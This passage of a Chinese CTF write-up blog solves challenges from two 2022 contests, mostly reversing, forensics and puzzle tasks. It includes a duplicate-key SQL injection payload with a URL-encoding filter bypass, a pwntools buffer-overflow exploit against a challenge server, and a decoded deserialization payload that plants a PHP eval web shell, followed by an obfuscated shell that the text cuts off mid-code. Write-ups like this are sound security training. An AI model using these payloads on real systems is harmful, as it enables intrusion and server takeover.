class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>发现其中存在两个点需要绕过：</p><ol><li>路由 <code>/search</code> 中JSON严格过滤，<code>name</code> 的值必须满足 <code>isalnum()</code>，<code>votes</code> 的值必须为数字，避免SQL注入情况；</li><li>检测url里使用GET方法传入 <code>action=readFlag</code> 会直接拒绝。</li></ol><p>对于第1点，尝试构造含两个 <code>name</code> 参数的JSON，在python中认JSON中第二个 <code>name</code>，而go中认JSON中第一个 <code>name</code>，利用这种差异构造：<code>&#123;&quot;votes&quot;:1,&quot;name&quot;:&quot;-1&#39; union select 1,secret,3 from token --+&quot;,&quot;name&quot;:[]&#125;</code>，绕过得到token值，得到 <code>re@l1y_4th_T0k3n</code>。</p><p>对于第2点，利用 <code>@app.route(&quot;/&lt;path:path&gt;&quot;)</code> 特性，对 <code>?</code> 进行url编码可以在python层面绕过GET参数识别，即 <code>action = request.args.get(&#39;action&#39;)</code> 不会获取到内容，payload：<code>/flag%3faction=readFlag&amp;token=re@l1y_4th_T0k3n</code>。</p><p>得到flag：<code>&quot;&#123;\&quot;msg\&quot;:\&quot;Congrats this is your flag: flag&#123;73c468d2-582e-4fdf-8be9-72efe6cbb9a2&#125;\\n\&quot;&#125;\n&quot;</code></p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="hiahia-o-▽-┛"><a href="#hiahia-o-▽-┛" class="headerlink" title="hiahia o(*^▽^*)┛"></a>hiahia o(*^▽^*)┛</h3><p>IDA查看伪码，无逆向，照着实现就行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="built_in">list</span>(<span class="string">b&#x27;igdb~Mumu@p&amp;&gt;%;%&lt;$&lt;p&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>(<span class="params">c,k</span>):</span></span><br><span class="line">    <span class="keyword">if</span> k&gt;<span class="number">9</span>:</span><br><span class="line">        <span class="keyword">if</span> k&amp;<span class="number">1</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> c-<span class="number">11</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> c+<span class="number">13</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> k&amp;<span class="number">1</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> c-<span class="number">3</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> c+<span class="number">5</span></span><br><span class="line">t=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    t+=<span class="built_in">chr</span>(flag(s[i],i))</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="comment"># flag&#123;RrrrEe33202111&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ANDROID"><a href="#ANDROID" class="headerlink" title="ANDROID"></a>ANDROID</h3><p>jadx查看MainActivity主逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">String trim = <span class="keyword">this</span>.input.getText().toString().trim();</span><br><span class="line"><span class="keyword">int</span>[] iArr = &#123;<span class="number">102</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">28</span>, <span class="number">127</span>, <span class="number">55</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">121</span>, <span class="number">58</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">42</span>&#125;;</span><br><span class="line"><span class="keyword">int</span>[] iArr2 = &#123;<span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>&#125;;</span><br><span class="line"><span class="keyword">if</span> (trim.length() != <span class="number">18</span>) &#123;</span><br><span class="line"><span class="keyword">this</span>.input.setText(<span class="string">&quot;FLAG错误&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span>[] charArray = trim.toCharArray();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span>; i++) &#123;</span><br><span class="line">iArr2[i] = i % <span class="number">2</span> == <span class="number">0</span> ? charArray[i] ^ i : charArray[i] ^ charArray[i + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">String str = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i2 = <span class="number">0</span>; i2 &lt; <span class="number">18</span>; i2++) &#123;</span><br><span class="line">str = str.concat(Integer.toHexString(iArr2[i2])).concat(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(str);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i3 = <span class="number">0</span>; i3 &lt; <span class="number">18</span>; i3++) &#123;</span><br><span class="line"><span class="keyword">if</span> (iArr2[i3] != iArr[i3]) &#123;</span><br><span class="line"><span class="keyword">this</span>.input.setText(<span class="string">&quot;FLAG错误！&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.input.setText(<span class="string">&quot;FLAG正确&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用z3解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag=[BitVec(<span class="string">f&#x27;flag<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="number">7</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>)]</span><br><span class="line">out=[<span class="number">102</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">28</span>, <span class="number">127</span>, <span class="number">55</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">121</span>, <span class="number">58</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">42</span>]</span><br><span class="line"></span><br><span class="line">s=[<span class="number">42</span>]*<span class="number">19</span></span><br><span class="line">ss=Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        s[i]=flag[i]^i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s[i]=flag[i]^flag[i+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    ss.add(s[i]==out[i])</span><br><span class="line"></span><br><span class="line">ss.check()</span><br><span class="line">m=ss.model()</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    res+=(<span class="built_in">chr</span>(m[flag[i]].as_long()))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># flag&#123;Reverse__APP</span></span><br></pre></td></tr></table></figure><p>加花括号闭合，得到flag：flag{Reverse__APP}</p><p>​    </p><h3 id="WAY"><a href="#WAY" class="headerlink" title="WAY"></a>WAY</h3><blockquote><p>flag{md5(result)}</p></blockquote><p>检测带upx壳，脱壳后IDA查看伪码，迷宫题，wsad代表上下左右，提取迷宫数组得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OIIII</span><br><span class="line">OOIO#</span><br><span class="line">IOOOI</span><br><span class="line">IOIOI</span><br><span class="line">IIIII</span><br></pre></td></tr></table></figure><p>容易得到路径：sdsddwd，MD5得到flag：flag{6654b3343f6f3f6223a721e7f65e87f8}</p><p>​    </p><h3 id="SPARK"><a href="#SPARK" class="headerlink" title="SPARK"></a>SPARK</h3><p>Sparc架构，IDA无法反编译为伪码，用Ghidra得到伪码主逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined8 <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  longlong unaff_g7;</span><br><span class="line">  <span class="keyword">int</span> local_res7d3;</span><br><span class="line">  undefined8 local_res7d7;</span><br><span class="line">  undefined8 local_res7df;</span><br><span class="line">  undefined8 local_res7e7;</span><br><span class="line">  undefined8 local_res7ef;</span><br><span class="line">  longlong local_res7f7;</span><br><span class="line">  </span><br><span class="line">  local_res7f7 = *(longlong *)(unaff_g7 + <span class="number">0x28</span>);</span><br><span class="line">  local_res7d7 = <span class="number">0</span>;</span><br><span class="line">  local_res7df = <span class="number">0</span>;</span><br><span class="line">  local_res7e7 = <span class="number">0x37463f3044413243</span>;</span><br><span class="line">  local_res7ef = <span class="number">0x3429000000000000</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input_sparkle_flag_here:\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>,&amp;local_res7d7,<span class="number">0xc</span>);</span><br><span class="line">  local_res7d3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">9</span> &lt; local_res7d3) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;good_job!&quot;</span>);</span><br><span class="line">LAB_001008a0:</span><br><span class="line">      <span class="keyword">if</span> (local_res7f7 == *(longlong *)(unaff_g7 + <span class="number">0x28</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      __stack_chk_fail();</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="keyword">char</span> *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) =</span><br><span class="line">         *(<span class="keyword">char</span> *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) + <span class="number">-0x2f</span>;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">char</span> *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) !=</span><br><span class="line">        *(<span class="keyword">char</span> *)((longlong)&amp;local_res7e7 + (longlong)local_res7d3)) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;incorrect\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LAB_001008a0;</span><br><span class="line">    &#125;</span><br><span class="line">    local_res7d3 = local_res7d3 + <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑为输入flag值逐字符 <code>-0x2f</code> 得到的字符串与 <code>0x37463f30444132433429</code> 相等，即ROT47。</p><p>简单还原得flag：flag{fun_sparcX}</p><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Ez-pwn"><a href="#Ez-pwn" class="headerlink" title="Ez_pwn"></a>Ez_pwn</h3><p>简单ret2text：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;hsc2019.site&#x27;</span>,<span class="number">10891</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(<span class="number">0x400741</span>)</span><br><span class="line">r.sendline(pl)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;本届HSC1th 2022是由社会战队红客突击队（Honker Security Commando）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖web，crypto，misc，re等主流方向，并面向全球开放。比赛三甲可获突击队周边礼品。</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>长安“战疫”网络安全卫士守护赛</title>
    <link href="https://lazzzaro.github.io/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/</id>
    <published>2022-01-08T10:00:01.000Z</published>
    <updated>2022-01-08T12:51:09.214Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>新冠疫情肆虐全球，这一场疫情阻击战不仅是我国卫生健康领域的一场战疫，也是科学技术领域的一次大考。在这个特殊时期，保障网络安全，防范利用新冠肺炎疫情实施的网络攻击行为是关系广大人民群众切身利益的大事。如网络攻击者将计算机病毒、木马和移动恶意程序等伪装成“肺炎病例”“防护通知”等信息，通过钓鱼邮件、恶意链接等方式进行传播，造成用户安全问题。</p><p>西安数所高校学生团体联合发起长安战疫网络安全公益科普赛和长安战疫“网络安全卫士”守护赛，一方面提升全民疫情期间的网络安全意识与疫情中常见问题的应对措施，另一方面提升我省的网络安全应急响应能力和网络安全从业者技术能力，协助用户提升网络安全防护能力，为战胜新冠肺炎提供网络空间保障。</p><p>Rank: 14</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="八卦迷宫"><a href="#八卦迷宫" class="headerlink" title="八卦迷宫"></a>八卦迷宫</h3><blockquote><p>一起走迷宫吧，要提交全拼音字符奥</p></blockquote><p><img src="/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/maze.png" alt="maze" style="zoom: 33%;"></p><p>走迷宫，串联经过的八卦对应文字：<code>cazy&#123;战长恙长战恙河长山山安战疫疫战疫安疫长安恙&#125;</code>，转为全拼：</p><p><code>cazy&#123;zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang&#125;</code></p><p>​    </p><h3 id="朴实无华的取证"><a href="#朴实无华的取证" class="headerlink" title="朴实无华的取证"></a>朴实无华的取证</h3><p>xp内存取证，先判断profile</p><p><code>volatility -f xp_sp3.raw imageinfo</code></p><p>查看进程 </p><p><code>volatility -f xp_sp3.raw --profile=WinXPSP2x86 pslist</code></p><p>发现notepad和mspaint，查看记事本</p><p><code>volatility -f xp_sp3.raw --profile=WinXPSP2x86 notepad</code></p><p>找到信息： <code>20211209(Encrypt)</code>。</p><p>再查看桌面文件</p><p><code>volatility -f xp_sp3.raw --profile=WinXPSP2x86 filescan | grep -E &quot;桌面&quot;</code></p><p>找到文件 <code>flag.zip</code> 和 <code>flag.png</code>，分别dump下来</p><p><code>flag.png</code> 中有密文信息： <code>FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]</code>，</p><p><code>flag.zip</code> 有密码，用前面的 <code>20211209</code> 解开找到加密算法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Encrypt</span><span class="params">(<span class="built_in">string</span>&amp; str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; str.length(); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(str[i] &gt;=<span class="string">&#x27;a&#x27;</span>&amp;&amp; str[i]&lt;=<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">str[i]+=<span class="number">3</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">str[i]=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">str[i]=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">str[i]=<span class="string">&#x27;c&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">str[i]=<span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">str[i] -= <span class="number">32</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还原flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">list</span>(<span class="string">b&#x27;FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]&#x27;</span>)</span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;w&#x27;</span>):</span><br><span class="line">        x += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="built_in">ord</span>(<span class="string">&#x27;x&#x27;</span>):</span><br><span class="line">        x = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="built_in">ord</span>(<span class="string">&#x27;y&#x27;</span>):</span><br><span class="line">        x = <span class="built_in">ord</span>(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        x = <span class="built_in">ord</span>(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="built_in">ord</span>(<span class="string">&#x27;_&#x27;</span>):</span><br><span class="line">        x = <span class="built_in">ord</span>(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">    x -= <span class="number">32</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> encrypt(j) == s[i]:</span><br><span class="line">            t += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t += <span class="string">&#x27;?&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line"><span class="comment"># cazy&#123;Xian?will?certainly?succeed?in?fighting?the?epidemic&#125;</span></span><br></pre></td></tr></table></figure><p><code>?</code> 改 <code>_</code> ，得到flag：<code>cazy&#123;Xian_will_certainly_succeed_in_fighting_the_epidemic&#125;</code></p><p>​    </p><h3 id="无字天书"><a href="#无字天书" class="headerlink" title="无字天书"></a>无字天书</h3><p>在流量包中发现 <code>secret</code> 流量，dump得到gzip包，内容为一串16进制字符串，其中包含 <code>504B0304</code>，转存为zip文件，内含 <code>flag.txt</code> 和 <code>key.ws</code> 两个纯空白字符文件。</p><p><code>key.ws</code> 中包含空格与tab字符及大量换行符，为whitespace语言，<a href="https://ideone.com/l/whitespace">在线运行</a>得到输出 <code>XiAnWillBeSafe</code>；</p><p><code>flag.txt</code> 中包含大量空格与tab字符，为snow隐写，密码 <code>XiAnWillBeSafe</code>，解密：</p><p><code>SNOW.EXE -C -p XiAnWillBeSafe flag.txt</code>，得到flag：</p><p><code>cazy&#123;C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng&#125;</code></p><p>​    </p><h3 id="西安加油"><a href="#西安加油" class="headerlink" title="西安加油"></a>西安加油</h3><p>在流量包中发现 <code>secret.txt</code> 流量，dump下来base64解码得到zip文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;secret.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;out.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(base64.b64decode(f))</span><br></pre></td></tr></table></figure><p>打开为拼图，共48张，选择带flag的部分图片纯手拼：</p><p><img src="/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/pintu.png" alt="pintu" style="zoom: 67%;"></p><p>flag：<code>cazy&#123;make_XiAN_great_Again&#125;</code></p><p>​    </p><h3 id="ez-Encrypt"><a href="#ez-Encrypt" class="headerlink" title="ez_Encrypt"></a>ez_Encrypt</h3><p>查看流量，发现是蚁剑流量，其中一个流中</p><p><code>TzozOToiTGVhZ3VlXEZseXN5c3RlbVxDYWNoZWRcU3RvcmFnZVxBZGFwdGVyIjo1OntzOjc6IgAqAGZpbGUiO3M6MTE6Ii4vc2hlbGwucGhwIjtzOjEwOiIAKgBhZGFwdGVyIjtPOjMwOiJMZWFndWVcRmx5c3lzdGVtXEFkYXB0ZXJcTG9jYWwiOjE6e3M6MTM6IgAqAHdyaXRlRmxhZ3MiO2k6MDt9czo5OiIAKgBleHBpcmUiO047czoxMToiACoAYXV0b3NhdmUiO2I6MDtzOjg6IgAqAGNhY2hlIjthOjE6e2k6MDtzOjI5OiI8P3BocCBldmFsKCRfUE9TVFsnY2F6eSddKSA%2FPiI7fX0%3D</code></p><p>base64解码为 <code>O:39:&quot;League\Flysystem\Cached\Storage\Adapter&quot;:5:&#123;s:7:&quot;.*.file&quot;;s:11:&quot;./shell.php&quot;;s:10:&quot;.*.adapter&quot;;O:30:&quot;League\Flysystem\Adapter\Local&quot;:1:&#123;s:13:&quot;.*.writeFlags&quot;;i:0;&#125;s:9:&quot;.*.expire&quot;;N;s:11:&quot;.*.autosave&quot;;b:0;s:8:&quot;.*.cache&quot;;a:1:&#123;i:0;s:29:&quot;&lt;?php eval($_POST[&#39;cazy&#39;]) ?&gt;&quot;;&#125;&#125;</code>，</p><p>说明通过反序列化漏洞写入一句话木马。</p><p>找到一长串base64编码字符串，解码保存为 <code>www.zip</code> 源码，在 <code>app\controller\Index.php</code> 中找到混淆处理过的马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> define(<span class="string">&#x27;IKlSux1227&#x27;</span>,<span class="keyword">__FILE__</span>);<span class="variable">$DusPFr</span>=base64_decode(<span class="string">&quot;bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqZHF0d3lpT2VBY1VaTHBDdUhuYm1ndkZzZlNhUFlsTUpCTmpSVmtLeFFEVFdJcnpFb1hHaA==&quot;</span>);<span class="variable">$arCiCL</span>=<span class="variable">$DusPFr</span>[<span class="number">3</span>].<span class="variable">$DusPFr</span>[<span class="number">6</span>].<span class="variable">$DusPFr</span>[<span class="number">33</span>].<span class="variable">$DusPFr</span>[<span class="number">30</span>];<span class="variable">$VvUrBZ</span>=<span class="variable">$DusPFr</span>[<span class="number">33</span>].<span class="variable">$DusPFr</span>[<span class="number">10</span>].<span class="variable">$DusPFr</span>[<span class="number">24</span>].<span class="variable">$DusPFr</span>[<span class="number">10</span>].<span class="variable">$DusPFr</span>[<span class="number">24</span>];<span class="variable">$DEomKk</span>=<span class="variable">$VvUrBZ</span>[<span class="number">0</span>].<span class="variable">$DusPFr</span>[<span class="number">18</span>].<span class="variable">$DusPFr</span>[<span class="number">3</span>].<span class="variable">$VvUrBZ</span>[<span class="number">0</span>].<span class="variable">$VvUrBZ</span>[<span class="number">1</span>].<span class="variable">$DusPFr</span>[<span class="number">24</span>];<span class="variable">$LnpnvY</span>=<span class="variable">$DusPFr</span>[<span class="number">7</span>].<span class="variable">$DusPFr</span>[<span 